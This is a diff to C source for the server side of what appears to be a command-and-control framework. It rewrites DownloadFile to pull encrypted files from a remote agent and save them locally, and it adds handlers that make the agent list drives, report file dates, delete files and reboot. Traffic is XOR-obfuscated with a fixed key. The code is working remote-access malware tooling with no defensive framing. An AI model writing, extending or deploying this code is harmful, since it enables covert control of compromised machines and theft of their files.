@@ -13,6 +13,8 @@
 #include <fcntl.h>  
 #include <errno.h>
 #include <termios.h>
+#include <libgen.h>
+#include <sys/param.h>
 #include "c2_modules.h"
 #define BUFFER_SIZE 2048
 #define TRAFFIC_KEY 0x02
@@ -255,6 +257,7 @@ void HandleStopProcess(char *cmd, int client_socket){
 
 // Server will send data , Agent will receive
 // GetFileFromC2() will be called in Agent/Client
+//DONE
 int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsPath) {
 
 
@@ -346,10 +349,10 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
     }
     
     decrypt( (unsigned char *)recv_buf,(size_t) strlen(recv_buf));
-    int err_no = 692;
+    int err_no = 16000;
     err_no = atoi(recv_buf);
     printf("err_no is %d\n",err_no);
-    if (err_no != 692){
+    if (err_no != 16000){
         printf("[x] File couldn't be sent: %s\n",strerror(err_no));
         close(file);
         close(tmp_fd);
@@ -386,54 +389,158 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
 
 // Server will receive data , Agent will send
 // UploadFileToC2() will be called from Agent/Client
-int DownloadFile(char *cmd,int client_socket, char * filename) {
+// ------ WORKING ON THAT
+int DownloadFile(char *cmd,int client_socket, char * filename, char * SavePath) {
 
-    // Receive filename
-    //char filename[256];
-    recv(client_socket, filename, sizeof(filename), 0);
-    printf("Receiving file: %s\n", filename);
-
-    // Receive file size
-    long file_size = 0;
-    recv(client_socket, &file_size, sizeof(file_size), 0);
-    printf("File size: %ld bytes\n", file_size);
-
+    ssize_t bytes_received = 0;
+    ssize_t sent_bytes = 0;
+    char recv_buf[BUFFER_SIZE] = {0};
+    char response_buf[BUFFER_SIZE] = {0};
+    
+    // Send command (encrypted)
+    encrypt((unsigned char *)cmd, (size_t)strlen(cmd));
+    sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
+    if (sent_bytes == -1) {
+        printf("[x] send() failed\n");
+        return -1;
+    }
+    
+    // Receive file size from client
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE, 0);
+    if (bytes_received <= 0) {
+        perror("[x] Failed to receive file size");
+        return -1;
+    }
+    
+    // Decrypt file size
+    decrypt((unsigned char *)recv_buf, (size_t)bytes_received);
+    long file_size = atol(recv_buf);
+    printf("[+] File size to receive: %ld bytes\n", file_size);
+    
+    // Construct full save path
+    char full_path[BUFFER_SIZE];
+    char *bnFileName = basename(filename);
+    snprintf(full_path, sizeof(full_path), "%s/%s", SavePath, bnFileName);
+    
     // Open file for writing
-    FILE* file = fopen(filename, "wb");
+    printf("full_path: %s\n",full_path);
+    FILE* file = fopen(full_path, "wb");
     if (!file) {
-        perror("Failed to open file");
+        perror("[x] Failed to open file for writing");
+        // Send error to client
+        sprintf(response_buf, "%d", errno);
+        encrypt((unsigned char *)response_buf, strlen(response_buf));
+        send(client_socket, response_buf, strlen(response_buf), 0);
+        return -1;
+    }
+    
+    // Send acknowledgment to client
+    sprintf(response_buf, "%d", 16000);
+    encrypt((unsigned char *)response_buf, strlen(response_buf));
+    sent_bytes = send(client_socket, response_buf, strlen(response_buf), 0);
+    if (sent_bytes == -1) {
+        printf("[x] Failed to send acknowledgment\n");
+        fclose(file);
+        return -1;
+    }
+    
+    printf("[+] Ready to receive file: %s\n", full_path);
+    
+    // Create temporary file for encrypted data
+    char tmp_filename[] = "/tmp/received_XXXXXX";
+    int tmp_fd = mkstemp(tmp_filename);
+    if (tmp_fd == -1) {
+        perror("[x] Failed to create temp file");
+        fclose(file);
+        return -1;
+    }
+    printf("[+] Created temporary file for encrypted data\n");
+    
+    // Receive encrypted data and write to temp file
+    int total_received = 0;
+    int remain_data = file_size;
+    
+    while (remain_data > 0) {
+        // Receive chunk
+        bytes_received = recv(client_socket, recv_buf, 
+                              MIN(BUFFER_SIZE, remain_data), 0);
+
         
-        exit(EXIT_FAILURE);
-    }
-
-    // Receive file data
-    char buffer[BUFFER_SIZE];
-    long total_received = 0;
-    int bytes_received;
-
-    while (total_received < file_size) {
-        bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
-        if (bytes_received <= 0) { break; }
-
-        fwrite(buffer, 1, bytes_received, file);
+        if (bytes_received <= 0) {
+            if (bytes_received == 0) {
+                printf("[!] Connection closed by client\n");
+            } else {
+                perror("[x] recv() failed");
+            }
+            break;
+        }
+        
+        // Write encrypted data to temp file
+        if (write(tmp_fd, recv_buf, bytes_received) != bytes_received) {
+            perror("[x] Failed to write to temp file");
+            break;
+        }
+        
         total_received += bytes_received;
-
-        // Show progress
-        printf("Received: %ld/%ld bytes (%.2f%%)\r",
-            total_received, file_size,
-            (double)total_received / file_size * 100);
-        fflush(stdout);
+        remain_data -= bytes_received;
+        
+        printf("Received %ld bytes, %d bytes remaining\n", 
+               bytes_received, remain_data);
+        
+        // Optional: Send acknowledgment for each chunk
+        // Uncomment if you want per-chunk acknowledgment
+        /*
+        sprintf(response_buf, "%d", 16000);
+        encrypt((unsigned char *)response_buf, strlen(response_buf));
+        sent_bytes = send(client_socket, response_buf, strlen(response_buf), 0);
+        if (sent_bytes == -1) {
+            printf("[x] Failed to send chunk acknowledgment\n");
+            break;
+        }
+        */
     }
-
-    printf("\nFile received successfully!\n");
-
+    
+    // Reset temp file pointer to beginning
+    lseek(tmp_fd, 0, SEEK_SET);
+    
+    // Read from temp file, decrypt, and write to final file
+    unsigned char buffer[BUFFER_SIZE];
+    ssize_t bytes_read;
+    int bytes_written = 0;
+    
+    printf("[+] Decrypting and writing file...\n");
+    
+    while ((bytes_read = read(tmp_fd, buffer, BUFFER_SIZE)) > 0) {
+        // Decrypt buffer
+        decrypt(buffer, (size_t)bytes_read);
+        
+        // Write to final file
+        size_t written = fwrite(buffer, 1, bytes_read, file);
+        if (written != bytes_read) {
+            perror("[x] Failed to write to final file");
+            break;
+        }
+        bytes_written += written;
+    }
+    
+    // Cleanup
     fclose(file);
-
+    close(tmp_fd);
+    unlink(tmp_filename);
+    
+    if (remain_data > 0) {
+        printf("[x] File transfer incomplete. %d bytes missing\n", remain_data);
+        return -1;
+    }
+    
+    printf("[+] File received successfully! Total bytes written: %d\n", bytes_written);
+    printf("[+] File saved to: %s\n", full_path);
+    
     return 0;
 }
 
 
-int DeleteRequestedFile(char *cmd, int client_socket, char * filename){
+int HandleDelete(char *cmd, int client_socket, char * filename){
     ssize_t sent_bytes = 0;
     ssize_t bytes_received = 0;
     encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
@@ -460,6 +567,65 @@ int DeleteRequestedFile(char *cmd, int client_socket, char * filename){
     
     printf("[x] Delete failed! Err: %d\n",err_no);
     return 0;
+}
+
+
+void HandleListDrives(char *cmd , int client_socket){
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return;
+    }
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
+    printf("%s\n",recv_buf);
+
+    return;
+}
+
+void HandleGetFileDate(char *cmd , int client_socket, char * filename){
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return;
+    }
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
+    
+    /*
+    //printf("[+] recv_buf == %s\n",recv_buf);
+    int err_no = atoi(recv_buf);
+    if (err_no == 0){
+        printf("[+] Deleted %s successfully!\n",filename);
+        return 0;
+    }
+    printf("[x] Delete failed! Err: %d\n",err_no);
+    */
+    printf("%s\n",recv_buf);
+    
+    
+
+    return;
 }
 
 int HandleReboot(char *cmd , int client_socket){
